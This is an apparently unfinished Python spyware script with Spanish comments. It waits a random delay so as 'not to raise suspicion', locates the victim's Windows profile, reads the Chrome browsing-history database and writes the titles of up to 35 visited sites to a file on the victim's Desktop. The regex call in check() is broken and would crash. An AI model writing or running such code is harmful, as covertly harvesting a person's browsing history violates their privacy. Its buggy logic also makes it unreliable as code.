import os
import re
import sqlite3
from time import sleep
from random import randrange

filename = 'Para ti.txt'
letra = os.getcwd()[:2]



def adormir():
    nhours = randrange(1, 4)
    minutes = randrange(0, 60)
    print(f"Durmiendo {nhours} horas y {minutes} minutos")
    htosec = nhours * 3600
    mtosec = minutes * 60
    # sleep(htosec + mtosec)



def create_file(user_path):
    file = open(user_path + "\\Desktop\\"+filename, 'w')
    file.write('Namaste')
    return file


def get_chistory(user_path):
    urls = None
    while not urls:
        try:
            history_path = user_path + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History'
            con = sqlite3.connect(history_path)
            cursor = con.cursor()
            cursor.execute('SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC')
            urls = cursor.fetchall()
            print(urls)
            con.close()
            return urls
        except sqlite3.OperationalError:
            print('db is being used')
            sleep(3)

def check(file, chrome_history):
    re.findall("https://twitter.com/[A-Z]")
    for item in chrome_history[:35]:
        file.write(f"sitio visitados:  {item[0]}\n")


def main():
    #esperamos un tiempo para no levantar sospechas
    adormir()
    #Calculamos la ruta
    user_path = letra+"\\Users\\" + os.getlogin()
    #creamos un archivo en el escritorio
    file = create_file(user_path)
    #recogemos su historial
    chrome_history = get_chistory(user_path)
    check(file,chrome_history)



if __name__ == "__main__":
    main()
